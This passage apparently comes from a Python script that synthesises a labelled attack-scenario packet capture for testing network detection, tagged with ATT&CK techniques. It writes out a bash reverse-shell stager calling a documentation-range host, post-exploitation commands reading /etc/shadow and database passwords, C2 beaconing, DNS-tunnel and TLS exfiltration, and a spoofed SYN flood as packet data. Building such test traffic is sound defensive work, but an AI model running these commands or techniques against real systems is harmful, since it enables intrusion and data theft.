stager = b'#!/bin/sh\n# update helper\nbash -i >& /dev/tcp/198.51.100.23/4444 0>&1\n'
tt, _ = http(tt + 0.3, WEB, C2, http_req('GET', '/x.sh', '198.51.100.23', 'Wget/1.21.2'),
             http_resp(200, 'OK', stager, 'application/x-sh', b'nginx/1.18.0'))
rs = TcpSess(WEB, C2, 4444)
tt = rs.open(tt + 0.4, rtt=0.09)
convo = [(False, b'id\n'), (True, b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'),
         (False, b'uname -a\n'), (True, b'Linux web01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\n'),
         (False, b'cat /etc/shadow\n'), (True, b'cat: /etc/shadow: Permission denied\n'),
         (False, b'ls -la /var/backups\n'), (True, b'total 2716\n-rw-r--r-- 1 root root 1310720 Nov 11 02:00 customers_db.sql.gz\n-rw-r--r-- 1 root root   40960 Nov 11 02:00 apt.extended_states.0\n'),
         (False, b'cat /var/www/html/config.php | grep -i pass\n'), (True, b"$db_pass = 'Pr0duct10n!DB';\n"),
         (False, b'ip neigh\n'), (True, b'10.0.0.1 dev eth0 lladdr 00:1a:2b:3c:4d:01 REACHABLE\n10.0.0.15 dev eth0 lladdr 3c:22:fb:a1:15:0f STALE\n10.0.0.31 dev eth0 lladdr f8:ff:c2:31:7a:1f STALE\n')]
for frm, data in convo:
    tt += random.uniform(1.0, 3.0) if not frm else 0.05
    rs.send(tt, frm, 'PA', data)
    rs.send(tt + 0.045, not frm, 'A')

# 2g2. Second-stage payload disguised as an image (harmless ELF-shaped stand-in)
http(79.5, WEB, C2, http_req('GET', '/img/kworker.jpg', '198.51.100.23', 'Wget/1.21.2'),
     http_resp(200, 'OK', fake_elf(b'Deepacket sample - not a real program'), 'image/jpeg', b'nginx/1.18.0'))

# 2h. C2 beaconing over HTTP every ~10s (T1071.001)
for i in range(9):
    bt = 84.0 + i * 10.0 + random.uniform(-0.15, 0.15)
    http(bt, WEB, C2, http_req('GET', '/api/v2/checkin?id=7f3a9c&s=%d' % i, 'cdn-update-sync.net', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'),
         http_resp(200, 'OK', '{"task":"sleep","interval":10}', 'application/json', b'nginx/1.18.0'), port=8080)

# 2i. Internal discovery: ping sweep + SMB lateral movement attempts (T1018, T1021.002)
tt = 92.0
alive = {'10.0.0.1', '10.0.0.15', '10.0.0.31', '10.0.0.40', '10.0.0.41'}
for h in range(1, 41):
    dst = '10.0.0.%d' % h
    if dst == WEB: continue
    add(tt, ip_pkt(WEB, dst, ICMP(type=8, id=0x4242, seq=h) / Raw(load=b'\x00' * 32)))
    if dst in alive:
        add(tt + 0.0005, ip_pkt(dst, WEB, ICMP(type=0, id=0x4242, seq=h) / Raw(load=b'\x00' * 32)))
    tt += 0.02
tt += 1.0
for dst in ['10.0.0.15', '10.0.0.31', '10.0.0.40', '10.0.0.41', '10.0.0.1']:
    for port in (445, 3389, 22):
        sp = random.randint(40000, 60000)
        add(tt, ip_pkt(WEB, dst, TCP(sport=sp, dport=port, flags='S', seq=random.randint(1, 2**31))))
        if dst == '10.0.0.31' and port == 445:
            add(tt + 0.0006, ip_pkt(dst, WEB, TCP(sport=port, dport=sp, flags='SA', seq=random.randint(1, 2**31))))
        else:
            add(tt + 0.0006, ip_pkt(dst, WEB, TCP(sport=port, dport=sp, flags='RA', seq=0)))
        tt += 0.05

# 2j. DNS tunneling exfiltration (T1048.003 / T1071.004)
secret = (b'customer_id,name,email,card_last4\n' + b''.join(b'%d,Customer %d,user%d@example.com,%04d\n' % (i, i, i, random.randint(0, 9999)) for i in range(60)))
enc = base64.b32encode(secret).decode().rstrip('=').lower()
tt = 101.0
for i in range(0, min(len(enc), 52 * 34), 52):
    chunk = enc[i:i + 52]
    dns(tt, WEB, '%s.%d.d.exfil-tunnel.net' % (chunk, i // 52), [], qtype='TXT', txt='ok')
    tt += random.uniform(0.12, 0.3)

# 2k. Bulk exfiltration over TLS to the C2 (T1041)
blocks = [random.randbytes(1024) for _ in range(6)]
ex = TcpSess(WEB, C2, 443)
tt = ex.open(112.0, rtt=0.09)
ex.send(tt + 0.001, True, 'PA', tls_client_hello('cdn-update-sync.net'))
tt = ex.xfer(tt + 0.1, False, tls_server_hello())
tt = ex.xfer(tt + 0.01, True, tls_app(1_450_000, blocks), gap=0.0035)
ex.close(tt + 0.1, rtt=0.09)

# 2l. SYN flood against the web server from spoofed sources (T1498 / T1499)
tt = 132.0
for i in range(900):
    src = '%d.%d.%d.%d' % (random.choice([45, 91, 103, 185, 193]), random.randint(0, 255), random.randint(0, 255), random.randint(1, 254))
    add(tt, Ether(src=GW_MAC, dst=mac(WEB)) / IP(src=src, dst=WEB, ttl=random.randint(40, 60)) /
        TCP(sport=random.randint(1024, 65535), dport=80, flags='S', seq=random.randint(1, 2**31), window=random.choice([512, 1024, 8192])))
    tt += 0.004

pkts.sort(key=lambda p: p.time)
out = sys.argv[1] if len(sys.argv) > 1 else str(__import__('pathlib').Path(__file__).resolve().parent.parent / 'samples' / 'attack_scenario.pcap')
wrpcap(out, pkts)
print('wrote', out, len(pkts), 'packets')
